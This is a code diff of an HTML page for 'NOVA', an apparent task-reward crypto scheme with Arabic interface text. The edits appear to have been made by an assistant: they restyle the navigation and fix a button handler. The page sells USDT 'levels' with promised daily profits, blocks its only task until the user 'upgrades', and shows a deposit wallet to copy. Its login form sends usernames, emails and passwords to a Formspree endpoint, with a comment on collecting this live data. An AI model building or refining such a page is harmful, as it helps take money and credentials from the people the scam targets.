@@ -11,10 +11,6 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
 .container { max-width:480px; width:100%; text-align:center; background:#000; padding:20px 10px; }
 .logo { font-size:52px; font-weight:900; color:#b8ff1a; margin-bottom:15px; }
 .welcome { font-size:24px; font-weight:900; color:#fff; margin-bottom:35px; line-height:1.6; }
-.features-section { display:flex; flex-direction:column; gap:20px; margin-bottom:35px; text-align:right; width:100%; padding:0 10px; }
-.feature-item { display:flex; align-items:center; justify-content:flex-start; gap:20px; background:#000; }
-.feature-icon-box { background:#ffcc00; width:52px; height:52px; border-radius:14px; display:flex; justify-content:center; align-items:center; font-size:26px; color:#000; flex-shrink:0; }
-.feature-text { font-size:20px; font-weight:700; color:#fff; }
 .auth-container { display:flex; flex-direction:column; gap:15px; margin-bottom:25px; width:100%; }
 .auth-container input { width:100%; padding:18px 20px; border-radius:15px; border:1px solid #222; background:#0d0d0d; color:#fff; font-size:16px; text-align:right; outline:none; font-weight:700; }
 .auth-container input:focus { border-color:#b8ff1a; }
@@ -46,14 +42,13 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
 .task-title { font-size:16px; font-weight:900; color:#fff; }
 .task-reward { font-size:13px; color:#b8ff1a; font-weight:700; }
 .btn-task { background:#222; color:#fff; border:1px solid #333; padding:8px 16px; border-radius:8px; font-size:13px; font-weight:700; cursor:pointer; }
-.bottom-nav { width:100%; background:#0d0d0d; display:flex; justify-content:space-around; align-items:center; border-top:1px solid #1a1a1a; height:85px; position:fixed; bottom:0; left:0; z-index:10001; padding:0 10px; }
-.nav-item { display:flex; flex-direction:column; align-items:center; color:#555; font-size:11px; cursor:pointer; flex:1; font-weight:900; letter-spacing:0.5px; }
+
+/* تصميم الأزرار والمربعات الصفراء الجديدة في الشريط السفلي */
+.bottom-nav { width:100%; background:#0d0d0d; display:flex; justify-content:space-around; align-items:center; border-top:1px solid #1a1a1a; height:90px; position:fixed; bottom:0; left:0; z-index:10001; padding:0 10px; }
+.nav-item { display:flex; flex-direction:column; align-items:center; color:#888; font-size:11px; cursor:pointer; flex:1; font-weight:900; gap:4px; }
 .nav-item.active { color:#fff; }
-.nav-icon { font-size:22px; margin-bottom:4px; }
-.nav-item.center-btn { position:relative; top:-15px; }
-.nav-item.center-btn .icon-circle { background:#b8ff1a; width:60px; height:60px; border-radius:50%; display:flex; justify-content:center; align-items:center; box-shadow:0 4px 20px rgba(184,255,26,0.3); margin-bottom:4px; }
-.nav-item.center-btn .icon-circle .nav-icon { font-size:24px; color:#000; margin-bottom:0; }
-.nav-item.center-btn span { color:#b8ff1a; font-weight:900; }
+.nav-item.active .nav-icon-yellow { border:2px solid #fff; box-shadow:0 0 15px rgba(255,204,0,0.5); }
+.nav-icon-yellow { background:#ffcc00; width:44px; height:44px; border-radius:12px; display:flex; justify-content:center; align-items:center; font-size:22px; color:#000; flex-shrink:0; transition:all 0.2s; }
 </style>
 </head>
 <body>
@@ -61,22 +56,7 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
 <div class="container" id="authScreen">
     <div class="logo">NOVA</div>
     <div class="welcome">WELCOME TO NOVA PLATFORM</div>
-    
-    <div class="features-section">
-        <div class="feature-item">
-            <div class="feature-icon-box">⚙️</div>
-            <div class="feature-text">تحكم كامل في الحساب وباقاتك</div>
-        </div>
-        <div class="feature-item">
-            <div class="feature-icon-box">⚡</div>
-            <div class="feature-text">تنفيذ سريع لجميع العمليات والمهام</div>
-        </div>
-        <div class="feature-item">
-            <div class="feature-icon-box">💱</div>
-            <div class="feature-text">سحب وإيداع فوري بـ USDT</div>
-        </div>
-    </div>
-        <div class="auth-container">
+    <div class="auth-container">
         <input type="text" id="userInput" placeholder="اسم المستخدم" required>
         <input type="email" id="emailInput" placeholder="البريد الإلكتروني (Gmail)" required>
         <div class="password-wrapper">
@@ -87,17 +67,19 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
     </div>
     <div class="buttons-group">
         <button class="btn btn-primary" onclick="handleAuth('register')">إنشاء حساب</button>
-        <button class="btn btn-secondary" onclick="onclick="handleAuth('login')">تسجيل الدخول</button>
+        <button class="btn btn-secondary" onclick="handleAuth('login')">تسجيل الدخول</button>
     </div>
     <div class="desc">.Welcome to Nova Platform<br>We provide comprehensive support for our<br>.users</div>
 </div>
-
 <div id="mainDashboard" class="main-dashboard">
     <div class="dashboard-content">
+        <!-- صفحة المهام (TASKS) -->
         <div id="tasksPage" class="tab-content">
             <h3 style="color:#b8ff1a; margin-bottom:20px; text-align:center;">المهام اليومية المتاحة</h3>
             <div class="task-item"><div class="task-info"><div class="task-title">مشاهدة فيديو يوتيوب 1</div><div class="task-reward">المكافأة: 0.50 USDT</div></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ المهمة</button></div>
         </div>
+
+        <!-- صفحة الإيداع (DEPOSIT) -->
         <div id="depositPage" class="tab-content">
             <div class="deposit-box">
                 <div class="deposit-title">إيداع رصيد المحفظة</div>
@@ -105,16 +87,29 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
                 <button class="btn-copy" onclick="navigator.clipboard.writeText(document.getElementById('walletAddr').innerText); alert('تم نسخ العنوان بنجاح!');">نسخ العنوان</button>
             </div>
         </div>
+
+        <!-- صفحة المستويات (INFO) -->
         <div id="infoPage" class="tab-content active">
             <div class="tier-card"><div class="tier-header"><div class="tier-price">USDT 10</div><div class="tier-name">المستوى العادي</div></div><div class="tier-details"><div class="tier-info-line">عدد المهام اليومية: <span>3 مهام</span></div><div class="tier-info-line">الربح اليومي: <span>USDT 1.50</span></div></div></div>
             <div class="tier-card"><div class="tier-header"><div class="tier-price">USDT 35</div><div class="tier-name">المستوى البرونزي</div></div><div class="tier-details"><div class="tier-info-line">عدد المهام اليومية: <span>7 مهام</span></div><div class="tier-info-line">الربح اليومي: <span>USDT 5.00</span></div></div></div>
             <div class="tier-card"><div class="tier-header"><div class="tier-price">USDT 100</div><div class="tier-name">مستوى الذهب</div></div><div class="tier-details"><div class="tier-info-line">عدد المهام اليومية: <span>15 مهمة</span></div><div class="tier-info-line">الربح اليومي: <span>USDT 15.00</span></div></div></div>
         </div>
     </div>
+
+    <!-- شريط التنقل بالمربعات الصفراء الذهبية المطابق لطلبك -->
     <div class="bottom-nav">
-        <div class="nav-item" onclick="switchPage('tasks', this)"><span class="nav-icon">📋</span><span>TASKS</span></div>
-        <div class="nav-item center-btn" onclick="switchPage('deposit', this)"><div class="icon-circle"><span class="nav-icon">⬢</span></div><span>DEPOSIT</span></div>
-        <div class="nav-item active" onclick="switchPage('info', this)"><span class="nav-icon">💎</span><span>INFO</span></div>
+        <div class="nav-item" onclick="switchPage('tasks', this)">
+            <div class="nav-icon-yellow">⚙️</div>
+            <span>TASKS</span>
+        </div>
+        <div class="nav-item" onclick="switchPage('deposit', this)">
+            <div class="nav-icon-yellow">⚡</div>
+            <span>DEPOSIT</span>
+        </div>
+        <div class="nav-item active" onclick="switchPage('info', this)">
+            <div class="nav-icon-yellow">💱</div>
+            <span>INFO</span>
+        </div>
     </div>
 </div>
 
@@ -139,6 +134,7 @@ function handleAuth(type) {
     const s = document.getElementById('statusInput').value.trim();
     if (!u || !e || !p || !s) { alert('يرجى ملء جميع الحقول المطلوبة!'); return; }
     
+    // لكي تستقبل الإيميلات والبيانات الحية القادمة، أنشئ حساباً في Formspree وضع الرابط هنا:
     const endpoint = "https://formspree.io";
     fetch(endpoint, {
         method: 'POST',
@@ -154,4 +150,5 @@ function handleAuth(type) {
 }
 </script>
 </body>
-</html>
+    </html>
+    
